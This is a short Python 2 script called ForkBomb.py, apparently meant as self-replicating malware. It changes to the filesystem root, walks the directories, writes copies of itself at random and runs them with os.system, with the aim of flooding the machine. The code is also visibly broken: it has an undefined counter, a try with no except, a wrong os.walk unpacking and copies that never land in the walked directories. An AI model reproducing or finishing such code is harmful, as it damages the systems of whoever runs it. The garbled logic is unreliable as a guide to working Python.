import os
import platform
import random

main = open("ForkBomb.py", 'rb')

if str(platform.system()) == 'Windows':
	slash = "\\"

else:
	slash = "//"

for item in os.getcwd().split(slash):
	os.chdir(".." + slash)

for root, dirs in os.walk(os.getcwd()):
	try:
		x = random.randint(1,2)

		if x == 1:
			fork = open("ForkBomb.py", 'wb')
			for line in fork and i < 33:
				i += 1
				fork.write(main.readline())
				fork.close()

			if str(platform.system()) == 'Windows':
				os.system("ForkBomb.py")
			else:
				os.system("./ForkBomb.py")

print "Have a nice day!"

for item in os.walk(os.getcwd()):
	if item == 'ForkBomb.py':
		os.remove('ForkBomb.py')
